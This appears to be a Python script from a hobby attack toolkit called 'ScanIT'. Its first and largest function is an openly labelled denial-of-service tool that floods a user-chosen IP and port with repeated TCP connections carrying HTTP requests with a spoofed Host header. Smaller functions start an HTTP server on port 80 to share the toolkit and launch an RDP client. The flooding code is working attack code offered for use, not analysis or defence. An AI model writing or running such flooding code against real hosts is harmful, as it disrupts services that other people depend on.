#!/usr/bin/python3

#importing modules 
import socket
import Output
import pyfiglet
import time
from datetime import datetime
from os import system
from termcolor import colored
from tqdm import tqdm

    
try:
    # 1. dos attack
    attack_num = 0


    def dos():
        system('clear')
        print("-" * 60)
        txt = colored(pyfiglet.figlet_format("ScanIT", 'banner3'), 'blue')
        for i in txt:
            print(i, end='')
            time.sleep(.001)
        print("-" * 60)
        print('\n')
        target = input("Enter Target IP (Eg:- 192.168.1.1): ")
        fake_ip = '182.21.20.32'
        port = int(input("Enter a open port (Eg:- 135): "))
        att = int(input('Enter no of Attacks (Eg: - 100): '))

        def attack():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                global attack_num
                attack_num += 1
                print('Attack', attack_num)
                s.close()
            except:
                error = colored('\nError (check IP address or Port Number) \n\n', 'red')
                print(error)
                dos()

        Output.newline()
        Output.dosdata(target, att)
        for i in range(att):
            attack()
        for i in tqdm(range(10), 'Attacking Successfully completed', colour='green'):
            time.sleep(.1)
        back = input("Do you want scan again (y/n): ")
        if back == 'y' or back == 'Y':
            system('./Attacking/main.py')
    def server():
        system('clear')
        print("-" * 60)
        txt = colored(pyfiglet.figlet_format("ScanIT", 'banner3'), 'blue')
        for i in txt:
            print(i, end='')
            time.sleep(.001)
        print("-" * 60)
        print('\n')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('8.8.8.8',53))
        ip=s.getsockname()[0]
        s.close()
        print(f' copy and paste this link \n \n http://{ip}/Attacking \n\n\n')
        system('python -m http.server 80')

        back = input("\n Do you want scan again (y/n): ")
        if back == 'y' or back == 'Y':
            system('./Attacking/main.py')
    def rdp():
        system('clear')
        print("-" * 60)
        txt = colored(pyfiglet.figlet_format("ScanIT", 'banner3'), 'blue')
        for i in txt:
            print(i, end='')
            time.sleep(.001)
        print("-" * 60)
        print('\n')
        user = input("Enter user name (Eg:- wade): ")
        ip = input("Enter server ip (Eg:- 192.168.1.1) :")
        system(f'remmina -c rdp://{user}@{ip}')
        back = input("\n Do you want scan again (y/n): ")
        if back == 'y' or back == 'Y':
            system('./Attacking/main.py')
except KeyboardInterrupt:
    print("\n\n")
    back = input("Do you want to EXIT (y/n): ")
    if back == 'n' or back == 'N':
        system('./Attacking/main.py')
    else:
        print("Exiting...")
except:
    print("Unexpected error occured try again")